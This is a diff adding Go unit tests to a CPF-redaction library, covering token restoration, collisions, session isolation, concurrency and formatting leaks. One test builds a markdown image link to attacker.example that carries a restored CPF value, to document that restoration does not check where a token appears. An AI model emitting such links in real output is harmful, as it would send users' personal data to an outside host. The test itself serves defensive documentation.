@@ -1,12 +1,17 @@
 package redactbr
 
 import (
+	"bytes"
+	"encoding/json"
 	"errors"
 	"fmt"
+	"math/rand/v2"
 	"strings"
 	"sync"
 	"testing"
 	"unsafe"
+
+	"github.com/GuilhermeMikin/redactbr/internal/cpf"
 )
 
 // Fixtures are generated (see redactor_test.go); none was collected.
@@ -200,6 +205,114 @@ func TestPreexistingTokenLiteralNeverGainsAuthority(t *testing.T) {
 	})
 }
 
+// A valid token restores whoever wrote it: the random id protects against collisions and guessing, and a
+// session has no way to tell who produced a text. This test documents that limit (spec §12.8), which is why
+// a session is a trust scope.
+func TestValidTokenRestoresWhoeverWritesIt(t *testing.T) {
+	s := newTestRedactor(t).NewSession()
+	tok := mustRedact(t, s, "123.456.789-09")
+
+	// A user repeats a token they saw: it passes through the session unchanged and is not reserved.
+	if got := mustRedact(t, s, "what is "+tok+"?"); got != "what is "+tok+"?" {
+		t.Fatal("an issued token in the input was changed")
+	}
+	// A model, or someone prompting it, repeats the token in an answer.
+	if got := s.Restore("the value is " + tok); got != "the value is 123.456.789-09" {
+		t.Error("a reproduced token was not restored")
+	}
+	// Restoration does not look at where the token ended up: a URL gets the value too.
+	if got := s.Restore("![x](https://attacker.example/?c=" + tok + ")"); got != "![x](https://attacker.example/?c=123.456.789-09)" {
+		t.Error("a token inside a URL was not restored")
+	}
+}
+
+// Reservation covers text that passes through Session.Redact, whole. Outside that, only the random id
+// protects a look-alike (spec §12.3), which these tests make visible by forcing the collision.
+func TestReservationLimits(t *testing.T) {
+	const literal = "<CPF_aaaaaaaaaa>"
+	t.Run("text that never reached the session", func(t *testing.T) {
+		s := newTestRedactor(t).NewSession()
+		s.fill = idSource("aaaaaaaaaa")
+		mustRedact(t, s, "123.456.789-09")
+		if got := s.Restore(literal); got != "123.456.789-09" {
+			t.Error("expected the forced collision to restore: the session did not see this text before")
+		}
+	})
+	t.Run("a look-alike split across calls", func(t *testing.T) {
+		s := newTestRedactor(t).NewSession()
+		s.fill = idSource("aaaaaaaaaa")
+		mustRedact(t, s, literal[:8])
+		mustRedact(t, s, literal[8:])
+		if got := mustRedact(t, s, "123.456.789-09"); got != literal {
+			t.Error("expected the forced collision: neither call saw the whole look-alike")
+		}
+	})
+}
+
+// Sessions are isolated by their issued sets, not by chance: with the same id drawn in both, each restores
+// its own value.
+func TestSessionsDrawingTheSameIDKeepTheirValues(t *testing.T) {
+	r := newTestRedactor(t)
+	s1, s2 := r.NewSession(), r.NewSession()
+	s1.fill, s2.fill = idSource("aaaaaaaaaa"), idSource("aaaaaaaaaa")
+	t1, t2 := mustRedact(t, s1, "123.456.789-09"), mustRedact(t, s2, "987.654.321-00")
+	if t1 != t2 {
+		t.Fatal("the test needs both sessions to issue the same token")
+	}
+	if s1.Restore(t1) != "123.456.789-09" || s2.Restore(t2) != "987.654.321-00" {
+		t.Error("a session restored a value from another session")
+	}
+}
+
+// Tokens are matched byte for byte: no single edit of a token restores anything.
+func TestNoSingleByteEditOfATokenRestores(t *testing.T) {
+	s := newTestRedactor(t).NewSession()
+	s.fill = idSource("k7q2xm9pb3")
+	tok := mustRedact(t, s, "123.456.789-09")
+	check := func(edited string) {
+		t.Helper()
+		if !strings.Contains(edited, tok) && s.Restore(edited) != edited { // "<" + tok still holds the token
+			t.Errorf("Restore changed an edited token: %q", edited)
+		}
+	}
+	for i := range len(tok) {
+		check(tok[:i] + tok[i+1:]) // deletion
+		if i+1 < len(tok) {
+			check(tok[:i] + tok[i+1:i+2] + tok[i:i+1] + tok[i+2:]) // transposition
+		}
+		for b := range 256 {
+			check(tok[:i] + string([]byte{byte(b)}) + tok[i+1:]) // substitution
+			if i > 0 {
+				check(tok[:i] + string([]byte{byte(b)}) + tok[i:]) // insertion inside the token
+			}
+		}
+	}
+	// A case change as a model might make it, and common rewrites.
+	for _, edited := range []string{
+		strings.ToUpper(tok), strings.ToLower(tok), "[CPF_k7q2xm9pb3]", "{{CPF_k7q2xm9pb3}}", "&lt;CPF_k7q2xm9pb3&gt;",
+		`\u003cCPF_k7q2xm9pb3\u003e`, "</CPF_k7q2xm9pb3>", "<CPF_k7q2xm9pb3/>", "<CPF k7q2xm9pb3>", "< CPF_k7q2xm9pb3 >",
+	} {
+		check(edited)
+	}
+}
+
+// The issued token inside a broken one is still found, and nothing else around it changes.
+func TestRestoreFindsATokenAfterABrokenOne(t *testing.T) {
+	s := newTestRedactor(t).NewSession()
+	s.fill = idSource("k7q2xm9pb3")
+	mustRedact(t, s, "123.456.789-09")
+	for in, want := range map[string]string{
+		"<CPF_abc<CPF_k7q2xm9pb3>":       "<CPF_abc123.456.789-09",
+		"<<CPF_k7q2xm9pb3>>":             "<123.456.789-09>",
+		"<CPF_<CPF_k7q2xm9pb3>":          "<CPF_123.456.789-09",
+		"<CPF_k7q2xm9pb<CPF_k7q2xm9pb3>": "<CPF_k7q2xm9pb123.456.789-09",
+	} {
+		if got := s.Restore(in); got != want {
+			t.Errorf("Restore(%q) = %q, want %q", in, got, want)
+		}
+	}
+}
+
 func TestSessionCapacity(t *testing.T) {
 	r := newTestRedactor(t, WithMaxSessionValues(2))
 	s := r.NewSession()
@@ -300,6 +413,75 @@ func TestSessionConcurrentUse(t *testing.T) {
 	}
 }
 
+// Issuing, reserving and streaming at the same time, with ids drawn from a small space so that they often
+// collide with look-alikes: every stream restores the session's tokens and nothing else, and no reserved
+// string is ever issued.
+func TestConcurrentRedactAndStreams(t *testing.T) {
+	const goroutines, rounds, space = 16, 50, 10000
+	s := newTestRedactor(t, WithMaxSessionValues(1<<20)).NewSession()
+	s.fill = func(b []byte) error {
+		id := fmt.Sprintf("%010d", rand.IntN(space))
+		for i := range b {
+			b[i] = byte(strings.IndexByte(idAlphabet, id[i]))
+		}
+		return nil
+	}
+	// One id in eight is reserved before anything is issued, so these must stay verbatim in every stream.
+	var lookAlikes []string
+	for id := 0; id < space; id += 8 {
+		lit := fmt.Sprintf("<CPF_%010d>", id)
+		lookAlikes = append(lookAlikes, lit)
+		mustRedact(t, s, lit)
+	}
+	var wg sync.WaitGroup
+	for g := range goroutines {
+		wg.Go(func() {
+			for i := range rounds {
+				var base [cpf.BaseLen]byte
+				copy(base[:], fmt.Sprintf("%09d", g*rounds+i+1))
+				dv1, dv2, _ := cpf.CheckDigits(base)
+				value := string(base[:3]) + "." + string(base[3:6]) + "." + string(base[6:]) + "-" + string([]byte{dv1, dv2})
+
+				// Text that may or may not be issued by the time it arrives; only the last check covers it.
+				tok, err := s.Redact(fmt.Sprintf("<CPF_%010d>", rand.IntN(space)))
+				if err == nil {
+					tok, err = s.Redact(value)
+				}
+				if errors.Is(err, errTokenCollision) {
+					continue // failing closed is a valid outcome when every draw collides
+				}
+				if err != nil {
+					t.Error(err)
+					return
+				}
+				lit := lookAlikes[(g*rounds+i)%len(lookAlikes)]
+				var out bytes.Buffer
+				w := s.RestoreWriter(&out)
+				for _, c := range strings.SplitAfter("value "+tok+" "+lit+" end", "_") {
+					if _, err := w.Write([]byte(c)); err != nil {
+						t.Error(err)
+						return
+					}
+				}
+				if err := w.Close(); err != nil {
+					t.Error(err)
+					return
+				}
+				if want := "value " + value + " " + lit + " end"; out.String() != want {
+					t.Errorf("stream restored %q, want %q", out.String(), want)
+					return
+				}
+			}
+		})
+	}
+	wg.Wait()
+	for lit := range s.reserved {
+		if _, issued := s.values[lit]; issued {
+			t.Fatalf("a reserved string was issued: %q", lit)
+		}
+	}
+}
+
 // A session must not keep its inputs alive: stored values and reservations are copies, not substrings.
 func TestSessionDoesNotRetainInput(t *testing.T) {
 	s := newTestRedactor(t).NewSession()
@@ -329,9 +511,18 @@ func TestSessionDoesNotRetainInput(t *testing.T) {
 func TestSessionStringHidesContents(t *testing.T) {
 	s := newTestRedactor(t).NewSession()
 	tok := mustRedact(t, s, "123.456.789-09")
-	for _, got := range []string{s.String(), fmt.Sprint(s), fmt.Sprintf("%+v", s), fmt.Sprintf("%#v", s)} {
-		if strings.Contains(got, "123") || strings.Contains(got, tok) {
-			t.Errorf("formatting a session revealed its contents")
+	for _, got := range []string{
+		s.String(), fmt.Sprint(s), fmt.Sprintf("%+v", s), fmt.Sprintf("%#v", s),
+		fmt.Sprint(*s), fmt.Sprintf("%+v", *s), fmt.Sprintf("%#v", *s), // dereferenced
+		fmt.Sprintf("%+v", struct{ S *Session }{s}), fmt.Sprintf("%+v", struct{ S Session }{*s}), // in a struct
+	} {
+		if strings.Contains(got, "123") || strings.Contains(got, tok) || strings.Contains(got, "CPF") {
+			t.Errorf("formatting a session revealed its contents: %s", got)
+		}
+	}
+	for _, v := range []any{s, *s} {
+		if got, err := json.Marshal(v); err != nil || string(got) != "{}" {
+			t.Errorf("json.Marshal(%T) = (%s, %v), want an empty object", v, got, err)
 		}
 	}
 	if s.String() != "redactbr.Session{values: 1, reserved: 0}" {
